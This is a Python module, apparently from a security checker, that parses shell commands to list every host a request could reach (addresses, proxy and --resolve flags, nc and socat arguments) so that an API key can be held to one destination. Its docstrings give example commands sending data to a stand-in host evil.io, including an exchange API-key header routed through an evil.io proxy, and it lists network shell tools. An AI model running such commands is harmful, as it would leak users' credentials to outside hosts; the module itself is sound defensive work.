"""Where a command sends what it carries: every host a request could reach.

A rule like "this exchange's key may only go to this exchange" is only as good as its
list of destinations. A web address is one, but a request reaches a host by many other
spellings (KI-379): a scheme-less ``curl evil.io/a``, ``--url evil.io``, a proxy
(``-x evil.io:8080``), ``--resolve api.binance.com:443:<ip>`` / ``--connect-to``, a
``wss://`` or ``ftp://`` address, or ``nc evil.io 80`` speaking raw HTTP. This module
reads all of them: every ``scheme://`` address in the text, plus the host arguments of
the network programs in it (positional arguments and the host-taking flags), with each
program's file- and data-taking flags skipped so ``-o out.md`` is never a "host".

Pattern: a small Interpreter over shell tokens (``shlex``; a whitespace split when the
quoting is broken). Pure, no I/O.

Usage::

    found = command_destinations("curl -H 'X-MBX-APIKEY: k' -x evil.io:8080 https://api.binance.com")
    found.hosts              # frozenset({"evil.io", "api.binance.com"})
    found.network_command    # True: a network program runs here
    found.header_file        # False: no "-H @file" (headers the text cannot show)
"""

from __future__ import annotations

import ipaddress
import re
import shlex
from dataclasses import dataclass

from . import text_view
from .. import public_suffix

#: Programs whose arguments name where they connect.
_NETWORK_PROGRAMS = frozenset({"curl", "wget", "http", "https", "xh", "nc", "ncat", "netcat", "socat", "telnet", "openssl"})
#: Flags whose value is a host or an address (curl, wget, xh/httpie, openssl s_client).
_HOST_FLAGS = frozenset({"-x", "--proxy", "--preproxy", "--socks4", "--socks4a", "--socks5", "--socks5-hostname",
                         "--url", "--resolve", "--connect-to", "--doh-url", "-e", "--referer", "--connect",
                         "-connect", "--execute"})
#: Flags whose value is NOT a host (a file, data, a header, a method, a number…): skipped.
_VALUE_FLAGS = frozenset({
    "-H", "--header", "-d", "--data", "--data-raw", "--data-binary", "--data-urlencode", "--data-ascii", "--json",
    "-F", "--form", "--form-string", "-o", "--output", "-O", "-T", "--upload-file", "-u", "--user", "-A",
    "--user-agent", "-X", "--request", "-b", "--cookie", "-c", "--cookie-jar", "-K", "--config", "-m",
    "--max-time", "--connect-timeout", "-w", "--write-out", "-r", "--range", "-E", "--cert", "--key", "--cacert",
    "--capath", "-D", "--dump-header", "--retry", "-Y", "-y", "-z", "--limit-rate", "--post-data", "--post-file",
    "--body-data", "--body-file", "--header-file", "-P", "--directory-prefix", "--input-file",
    "--output-document", "--port", "--wait", "-t", "--tries"})
#: Shell words that end one command (a program's arguments stop there).
_SEPARATORS = frozenset({"|", "||", "&", "&&", ";", "(", ")", "|&"})
#: Any ``scheme://host`` address (http, https, ws, wss, ftp, …).
_ADDRESS = re.compile(r"\b[a-z][a-z0-9+.-]{1,15}://([^\s'\"<>`/?#)\]]+)", re.IGNORECASE)
_HOSTNAME = re.compile(r"^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.){1,10}[a-z][a-z0-9-]{1,62}$", re.IGNORECASE)
#: A request reading its headers from a file (``-H @h.txt``): what it sends cannot be read here.
HEADER_FILE = re.compile(r"(?:^|\s)(?:-H|--header)[\s=]*['\"]?@", re.MULTILINE)


@dataclass(frozen=True)
class Destinations:
    """``hosts`` — every host (lower-case name or IP) the text could send to;
    ``network_command`` — a network program runs in the text; ``header_file`` — a
    request reads its headers from a file (``-H @file``), which the text cannot show."""

    hosts: frozenset[str]
    network_command: bool
    header_file: bool


def host_of(value: str, strict: bool = True) -> str:
    """The host in *value* (an address, ``host:port``, ``user@host/path``…), lower-case,
    or ``""`` when *value* names no host (a file name, a number, a word). With
    ``strict=False`` (the host of a ``scheme://`` address, which is a destination whatever
    it looks like) any non-empty host is returned, known top-level domain or not."""
    value = value.strip().strip("'\"")
    match = _ADDRESS.match(value)
    rest = match.group(1) if match else value
    rest = rest.split("/", 1)[0].rsplit("@", 1)[-1]
    if rest.startswith("["):                                     # [IPv6]:port
        return rest[1:rest.find("]")].lower() if "]" in rest else ""
    host = rest.split(":", 1)[0].strip(".").lower()
    try:
        return str(ipaddress.ip_address(host))
    except ValueError:
        pass
    if strict and (not _HOSTNAME.match(host) or host.rsplit(".", 1)[-1] not in public_suffix.load().rules):
        return ""
    return host


def _flag_hosts(flag: str, value: str) -> list[str]:
    """The hosts a host-taking flag's value names (``--resolve h:443:addr`` names two)."""
    if flag in ("--resolve", "--connect-to"):
        return [host for host in map(host_of, value.split(":")) if host]
    host = host_of(value)
    return [host] if host else []


def _tokens(text: str) -> list[str]:
    try:
        lexer = shlex.shlex(text, posix=True, punctuation_chars=True)
        lexer.whitespace_split = True
        return list(lexer)
    except ValueError:                                           # broken quoting: read it word by word
        return text.split()


def _positional_host(token: str) -> str:
    """The host a program's positional argument names: the whole token (``evil.io/a``,
    ``host:443``) or one of its colon-separated parts (socat's ``TCP:evil.io:80``)."""
    return host_of(token) or next((host for host in map(host_of, token.split(":")[1:]) if host), "")


def _program_hosts(tokens: list[str], depth: int = 0) -> tuple[set[str], bool]:
    """Hosts named by the network programs' arguments, and whether one runs at all. A
    quoted word holding spaces (``bash -c "curl …"``) is read as a command once more."""
    hosts: set[str] = set()
    running = False
    in_program = False
    skip_next: str = ""
    for token in tokens:
        if token in _SEPARATORS:
            in_program, skip_next = False, ""
            continue
        if skip_next:
            hosts.update(_flag_hosts(skip_next, token) if skip_next in _HOST_FLAGS else [])
            skip_next = ""
            continue
        if depth == 0 and " " in token.strip():
            inner_hosts, inner_running = _program_hosts(_tokens(token), depth + 1)
            hosts |= inner_hosts
            running = running or inner_running
        if not in_program:
            in_program = token.rsplit("/", 1)[-1].lower() in _NETWORK_PROGRAMS
            running = running or in_program
            continue
        flag, _equals, value = token.partition("=")
        if token.startswith("-"):
            if value and flag in _HOST_FLAGS:
                hosts.update(_flag_hosts(flag, value))
            elif not value and (flag in _HOST_FLAGS or flag in _VALUE_FLAGS):
                skip_next = flag
            continue
        host = _positional_host(token)
        if host:
            hosts.add(host)
    return hosts, running


#: The longest text read token by token (a longer one is read for addresses only).
_MAX_TOKENIZED = 100_000


def command_destinations(text: str) -> Destinations:
    """Every host *text* could send to (see module doc). Percent escapes are decoded first."""
    text = text_view.percent_decoded(text or "")
    hosts = {host for host in (host_of(match.group(0), strict=False) for match in _ADDRESS.finditer(text)) if host}
    program_hosts, running = _program_hosts(_tokens(text[:_MAX_TOKENIZED]))
    return Destinations(frozenset(hosts | program_hosts), running, bool(HEADER_FILE.search(text)))
